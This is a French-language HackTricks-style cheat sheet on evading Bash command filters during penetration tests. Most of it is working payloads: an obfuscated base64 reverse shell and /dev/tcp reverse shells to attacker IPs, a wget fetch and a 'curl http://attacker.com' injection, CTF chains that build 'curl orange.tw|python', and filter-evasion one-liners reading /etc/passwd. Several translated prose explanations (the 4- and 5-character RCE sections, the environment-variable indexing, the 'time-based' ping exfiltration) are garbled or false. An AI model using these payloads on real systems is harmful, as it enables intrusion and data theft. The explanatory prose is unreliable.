# Contourner les restrictions Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour créer et **automatiser facilement des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Contournement des limitations courantes

### Reverse Shell
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Shell inversée courte

Une shell inversée est une technique utilisée en piratage informatique pour obtenir un accès à distance à un système cible. Elle permet à un attaquant de contrôler le système cible à partir de son propre système. Voici un exemple de shell inversée courte en utilisant Bash :

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Dans cet exemple, le shell inversée se connecte à l'adresse IP `10.0.0.1` sur le port `8080`. L'option `-i` est utilisée pour ouvrir une session interactive, tandis que `>& /dev/tcp/10.0.0.1/8080` redirige les entrées et sorties standard vers la connexion réseau. En utilisant cette commande, un attaquant peut exécuter des commandes sur le système cible à distance.

Il est important de noter que l'utilisation de shell inversée pour accéder à un système sans autorisation est illégale et peut entraîner des conséquences juridiques graves. Cette technique est présentée uniquement à des fins éducatives et pour la sensibilisation à la sécurité.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Contourner les chemins et les mots interdits

Lorsque vous effectuez des tests de pénétration sur un système Linux, il est possible que vous rencontriez des restrictions de chemin ou des mots interdits qui limitent votre accès aux ressources du système. Heureusement, il existe des commandes Linux utiles qui peuvent contourner ces restrictions et vous permettre d'accéder aux fichiers et aux fonctionnalités souhaités.

#### Contourner les restrictions de chemin

Lorsque vous êtes confronté à une restriction de chemin, vous pouvez utiliser la commande `cd` avec des caractères spéciaux pour contourner cette restriction. Voici quelques exemples :

- Utilisez `cd ..` pour remonter d'un répertoire dans l'arborescence.
- Utilisez `cd /` pour accéder à la racine du système de fichiers.
- Utilisez `cd ~` pour accéder au répertoire personnel de l'utilisateur courant.
- Utilisez `cd /chemin/vers/répertoire` pour accéder directement à un répertoire spécifique.

#### Contourner les mots interdits

Lorsque vous rencontrez des mots interdits dans une commande, vous pouvez utiliser des caractères spéciaux pour les contourner. Voici quelques exemples :

- Utilisez des guillemets simples ou doubles pour entourer les mots interdits. Par exemple, `ls 'mot interdit'` ou `ls "mot interdit"`.
- Utilisez des caractères d'échappement, tels que `\`, pour désactiver le sens spécial des caractères interdits. Par exemple, `ls mot\ interdit`.

En utilisant ces commandes et techniques, vous pouvez contourner les restrictions de chemin et les mots interdits pour accéder aux ressources souhaitées lors de vos tests de pénétration sur un système Linux.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Contourner les espaces interdits

Lorsque vous êtes confronté à des restrictions d'accès à certains répertoires ou fichiers contenant des espaces dans leur nom, vous pouvez contourner ces restrictions en utilisant les commandes suivantes :

- Utilisez des guillemets simples ou doubles pour entourer le nom du répertoire ou du fichier. Par exemple, pour accéder au répertoire "my folder", vous pouvez utiliser la commande `cd 'my folder'`.

- Utilisez des caractères d'échappement pour indiquer que l'espace fait partie du nom. Par exemple, pour accéder au fichier "my file.txt", vous pouvez utiliser la commande `cat my\ file.txt`.

En utilisant ces techniques, vous pourrez contourner les restrictions d'accès liées aux espaces dans les noms de fichiers ou de répertoires.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Contourner le backslash et le slash

Lorsque vous êtes confronté à des restrictions de shell qui limitent l'utilisation du backslash (`\`) ou du slash (`/`), il existe quelques techniques que vous pouvez utiliser pour les contourner.

#### Utilisation de caractères hexadécimaux

Vous pouvez contourner les restrictions en utilisant des caractères hexadécimaux pour représenter les caractères interdits. Par exemple, pour contourner l'utilisation du backslash, vous pouvez utiliser `\x5c` pour représenter le backslash lui-même.

Exemple :
```
$ echo -e "\x5c/bin\x5cls"
```

#### Utilisation de caractères octaux

De même, vous pouvez utiliser des caractères octaux pour contourner les restrictions. Par exemple, pour contourner l'utilisation du slash, vous pouvez utiliser `\057` pour représenter le slash lui-même.

Exemple :
```
$ echo -e "\057bin\057ls"
```

#### Utilisation de caractères Unicode

Une autre technique consiste à utiliser des caractères Unicode pour contourner les restrictions. Par exemple, pour contourner l'utilisation du backslash, vous pouvez utiliser `\u005c` pour représenter le backslash lui-même.

Exemple :
```
$ echo -e "\u005cbin\u005cls"
```

#### Utilisation de commandes alternatives

Si les caractères spécifiques sont restreints, vous pouvez essayer d'utiliser des commandes alternatives pour atteindre le même objectif. Par exemple, au lieu d'utiliser `/bin/ls`, vous pouvez utiliser `ls` seul.

Exemple :
```
$ ls
```

Ces techniques peuvent être utiles pour contourner les restrictions de shell et exécuter des commandes même lorsque certains caractères sont interdits.
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Contourner les pipes

Lorsque vous rencontrez des restrictions d'accès à certaines commandes ou fonctionnalités dans un environnement Linux, vous pouvez contourner ces restrictions en utilisant des pipes. Les pipes permettent de rediriger la sortie d'une commande vers une autre commande, ce qui peut être utile pour contourner les restrictions imposées.

Voici un exemple de commande utilisant des pipes pour contourner les restrictions :

```bash
commande1 | commande2
```

Dans cet exemple, la sortie de la `commande1` est redirigée vers la `commande2`. Cela permet d'exécuter la `commande2` avec les résultats de la `commande1`, contournant ainsi les restrictions imposées à la `commande2`.

Il est important de noter que l'utilisation de pipes pour contourner les restrictions peut être considérée comme une violation de la politique de sécurité de certains systèmes. Il est donc essentiel de comprendre les conséquences potentielles et de respecter les règles et réglementations en vigueur avant d'utiliser cette technique.
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Contourner avec l'encodage hexadécimal

L'encodage hexadécimal est une technique couramment utilisée pour contourner les restrictions de Bash. Il permet de représenter les caractères spéciaux en utilisant leur valeur hexadécimale.

Voici comment utiliser l'encodage hexadécimal pour contourner les restrictions de Bash :

1. Trouvez le caractère que vous souhaitez utiliser en hexadécimal. Par exemple, si vous voulez utiliser le caractère `;`, sa valeur hexadécimale est `3b`.

2. Utilisez la syntaxe `\x` suivie de la valeur hexadécimale pour représenter le caractère. Par exemple, pour représenter le caractère `;`, vous utiliserez `\x3b`.

3. Utilisez cette représentation dans votre commande pour contourner les restrictions de Bash. Par exemple, au lieu d'utiliser `commande1 ; commande2`, vous utiliserez `commande1\x3bcommande2`.

L'encodage hexadécimal permet de contourner les restrictions de Bash en représentant les caractères spéciaux de manière différente. Cependant, il est important de noter que cette technique peut ne pas fonctionner dans tous les cas, car certaines applications peuvent filtrer ou détecter l'utilisation de caractères hexadécimaux.
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### Contourner les restrictions IP

Il existe plusieurs méthodes pour contourner les restrictions IP et accéder à des ressources ou des services qui sont normalement bloqués. Voici quelques techniques couramment utilisées :

- **Utilisation d'un proxy** : Un proxy permet de masquer votre adresse IP réelle en utilisant une adresse IP différente. Vous pouvez configurer votre navigateur ou votre système d'exploitation pour utiliser un proxy et ainsi accéder aux ressources bloquées.

- **Utilisation d'un VPN** : Un réseau privé virtuel (VPN) crée un tunnel sécurisé entre votre appareil et un serveur distant, masquant ainsi votre adresse IP réelle. Vous pouvez utiliser un service VPN pour accéder aux ressources bloquées en choisissant un serveur dans un pays où ces ressources sont accessibles.

- **Utilisation du réseau Tor** : Le réseau Tor est un réseau décentralisé qui permet de naviguer sur Internet de manière anonyme. En utilisant le navigateur Tor, votre trafic Internet est acheminé à travers plusieurs nœuds, masquant ainsi votre adresse IP réelle.

- **Utilisation d'un service de traduction en ligne** : Certains services de traduction en ligne permettent de contourner les restrictions IP en traduisant le contenu bloqué. Vous pouvez copier l'URL de la ressource bloquée dans le service de traduction, puis accéder à la traduction pour accéder au contenu.

Il est important de noter que l'utilisation de ces méthodes pour contourner les restrictions IP peut être illégale dans certains pays ou dans certaines circonstances. Il est donc essentiel de respecter les lois en vigueur et de prendre des précautions pour protéger votre anonymat et votre sécurité en ligne.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Exfiltration de données basée sur le temps

Lorsque vous effectuez un test de pénétration, il peut être nécessaire d'exfiltrer des données sensibles du système cible. Cependant, il est possible que le système soit configuré pour restreindre l'accès à certains outils ou commandes, ce qui peut rendre cette tâche difficile. Dans de tels cas, vous pouvez utiliser une technique appelée "exfiltration de données basée sur le temps" pour contourner ces restrictions.

L'idée derrière cette technique est d'utiliser des commandes ou des outils disponibles sur le système cible pour transmettre les données sensibles à un autre système contrôlé par l'attaquant. L'un des outils couramment utilisés pour cela est la commande `ping`.

Voici comment cela fonctionne :

1. Divisez les données sensibles en petits morceaux.
2. Utilisez la commande `ping` pour envoyer ces morceaux de données à un autre système.
3. Utilisez un script ou un outil sur le système de réception pour collecter les morceaux de données et les reconstituer.

Voici un exemple de commande `ping` qui peut être utilisée pour exfiltrer des données :

```bash
ping -c 1 -p <data_chunk> <attacker_ip>
```

Dans cette commande, `<data_chunk>` représente un morceau de données et `<attacker_ip>` représente l'adresse IP du système contrôlé par l'attaquant.

Pour exfiltrer toutes les données, vous pouvez utiliser une boucle pour envoyer chaque morceau de données séquentiellement. Assurez-vous de configurer le système de réception pour collecter les données et les reconstituer correctement.

Il est important de noter que cette technique peut être lente, car elle dépend du temps de réponse du système cible. De plus, elle peut être détectée par des outils de surveillance réseau. Par conséquent, il est essentiel de prendre des mesures supplémentaires pour masquer cette activité, telles que l'utilisation de techniques d'obscurcissement ou de chiffrement des données.

En utilisant la technique d'exfiltration de données basée sur le temps, vous pouvez contourner les restrictions de bash et réussir à extraire des données sensibles d'un système cible.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Obtenir des caractères à partir de variables d'environnement

Il est possible d'obtenir des caractères à partir de variables d'environnement en utilisant la syntaxe `$VARNAME[index]` dans le shell Bash. Cela permet d'accéder à un caractère spécifique à partir de la valeur d'une variable d'environnement.

Par exemple, si nous avons une variable d'environnement appelée `SECRET` avec la valeur `password123`, nous pouvons obtenir le caractère `p` en utilisant la syntaxe suivante :

```bash
echo $SECRET[0]
```

Cela affichera le caractère `p` à la sortie.

Il est important de noter que l'index commence à partir de zéro, donc pour obtenir le deuxième caractère, nous utiliserions `$SECRET[1]`, pour le troisième caractère `$SECRET[2]`, et ainsi de suite.

Cette technique peut être utile lors de l'exploitation de vulnérabilités de fuite d'informations sensibles à partir de variables d'environnement.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### Exfiltration de données DNS

Vous pouvez utiliser **burpcollab** ou [**pingb**](http://pingb.in) par exemple.

### Commandes intégrées

Dans le cas où vous ne pouvez pas exécuter de fonctions externes et que vous avez uniquement accès à un **ensemble limité de commandes intégrées pour obtenir une RCE**, il existe quelques astuces pratiques pour le faire. Habituellement, vous **ne pourrez pas utiliser toutes** les **commandes intégrées**, donc vous devriez **connaître toutes vos options** pour essayer de contourner la restriction. Idée de [**devploit**](https://twitter.com/devploit).\
Tout d'abord, vérifiez toutes les [**commandes intégrées du shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Ensuite, voici quelques **recommandations** :
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Injection de commandes polyglottes

Polyglot command injection is a technique used to bypass restrictions imposed by the Bash shell. It involves injecting commands that can be interpreted by multiple shells, allowing an attacker to execute arbitrary commands regardless of the shell being used.

This technique is particularly useful when the target system has restricted access to certain commands or when the shell being used has limited functionality. By injecting a polyglot command, an attacker can exploit vulnerabilities and gain unauthorized access to the system.

To perform a polyglot command injection, an attacker needs to identify commands that are interpreted differently by various shells. These commands should be carefully crafted to ensure they are valid in multiple shell environments.

It is important to note that polyglot command injection can be a complex technique and requires a deep understanding of shell behavior and syntax. It is often used by experienced hackers during penetration testing to exploit vulnerabilities and gain unauthorized access to systems.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Contourner les regex potentielles

Certaines applications peuvent utiliser des expressions régulières (regex) pour restreindre les entrées utilisateur. Cependant, il est possible de contourner ces restrictions en utilisant des techniques spécifiques.

Voici quelques commandes Linux utiles pour contourner les regex potentielles :

- `grep -P` : Utilisez l'option `-P` avec la commande `grep` pour activer les expressions régulières de type Perl. Cela permet d'utiliser des fonctionnalités avancées qui peuvent contourner les regex restrictives.

- `sed` : La commande `sed` peut être utilisée pour effectuer des substitutions de texte. En utilisant des expressions régulières, vous pouvez contourner les restrictions en remplaçant les caractères interdits par d'autres caractères acceptés.

- `awk` : La commande `awk` est un puissant outil de traitement de texte qui peut également être utilisé pour contourner les regex restrictives. En utilisant des expressions régulières avec `awk`, vous pouvez manipuler les données de manière à contourner les restrictions.

- `perl` : Perl est un langage de programmation qui offre une grande flexibilité en matière de manipulation de texte. En utilisant des expressions régulières Perl, vous pouvez contourner les regex restrictives et effectuer des opérations avancées sur les données.

Il est important de noter que contourner les regex potentielles peut être considéré comme une violation de la sécurité et peut être illégal dans certains cas. Il est donc essentiel de respecter les lois et les politiques en vigueur lors de l'utilisation de ces techniques.
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Le Bashfuscator est un outil puissant utilisé pour contourner les restrictions de Bash. Il permet de rendre le code Bash illisible et difficile à comprendre pour les défenseurs. Le Bashfuscator utilise des techniques d'obfuscation pour masquer le code source, ce qui rend la détection et l'analyse plus difficiles pour les outils de sécurité.

Le Bashfuscator peut être utilisé pour contourner les mécanismes de sécurité tels que les filtres de mots clés, les listes noires et les restrictions d'exécution. Il peut également être utilisé pour masquer les commandes malveillantes et les payloads dans des scripts Bash légitimes.

L'utilisation du Bashfuscator nécessite une compréhension approfondie du langage Bash et des techniques d'obfuscation. Il est important de noter que l'utilisation du Bashfuscator dans un contexte illégal ou malveillant est strictement interdite et peut entraîner des conséquences légales graves.

Pour utiliser le Bashfuscator, il suffit de fournir le script Bash que vous souhaitez obfusquer en tant qu'entrée. L'outil générera ensuite une version obfusquée du script, qui peut être exécutée de la même manière que le script d'origine.

Il est important de noter que le Bashfuscator n'est pas une solution de sécurité complète. Il peut aider à contourner certaines restrictions, mais il ne garantit pas une protection totale contre les attaques. Il est donc essentiel de mettre en place d'autres mesures de sécurité pour protéger vos systèmes contre les attaques potentielles.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### RCE avec 5 caractères

Lors de l'exploitation d'une vulnérabilité de commande à distance (RCE), il est souvent nécessaire de contourner les restrictions imposées par le shell Bash. Voici une méthode simple pour contourner ces restrictions en utilisant seulement 5 caractères.

```bash
$ echo $0
bash
$ echo $BASH_VERSION
4.4.19(1)-release
$ echo $0-$BASH_VERSION
bash-4.4.19(1)-release
```

La variable d'environnement `$0` contient le nom du shell en cours d'exécution, tandis que la variable `$BASH_VERSION` contient la version de Bash. En concaténant ces deux variables avec un tiret `-`, nous pouvons exécuter une commande arbitraire en utilisant la syntaxe `$0-$BASH_VERSION`.

Voici un exemple d'utilisation de cette technique pour exécuter la commande `id` :

```bash
$ echo $0-$BASH_VERSION-id
bash-4.4.19(1)-release-id
```

En exécutant cette commande, nous obtenons la sortie suivante :

```bash
uid=1000(user) gid=1000(user) groups=1000(user)
```

Cette méthode peut être utilisée pour contourner les restrictions de Bash et exécuter des commandes arbitraires lors de l'exploitation d'une vulnérabilité de RCE.
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### RCE avec 4 caractères

Lors de l'exploitation d'une vulnérabilité de commande à distance (RCE), il est souvent nécessaire de contourner les restrictions imposées par le shell Bash. Dans certains cas, vous pouvez utiliser une technique qui ne nécessite que 4 caractères pour exécuter du code arbitraire.

La technique consiste à utiliser la commande `echo` pour exécuter du code Bash. Voici comment procéder :

1. Utilisez la commande `echo` pour afficher le code que vous souhaitez exécuter. Par exemple, si vous voulez exécuter la commande `ls`, vous pouvez utiliser la commande suivante :

   ```bash
   echo ls
   ```

2. Utilisez le caractère de redirection `>` pour rediriger la sortie de la commande `echo` vers le fichier `/tmp/cmd`. Par exemple :

   ```bash
   echo ls > /tmp/cmd
   ```

3. Utilisez la commande `source` pour exécuter le contenu du fichier `/tmp/cmd`. Par exemple :

   ```bash
   source /tmp/cmd
   ```

En utilisant cette technique, vous pouvez exécuter n'importe quelle commande Bash en utilisant seulement 4 caractères. Cependant, il est important de noter que cette technique peut être détectée par certains systèmes de détection d'intrusion, il est donc recommandé de l'utiliser avec prudence et uniquement dans un environnement contrôlé.
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Contournement de restrictions Bash

Si vous vous trouvez dans un système de fichiers avec des protections en lecture seule et noexec, ou même dans un conteneur distroless, il existe encore des moyens d'exécuter des binaires arbitraires, voire un shell !:

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Contournement de Chroot et autres prisons

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## Références et plus

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour créer et automatiser facilement des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? Ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
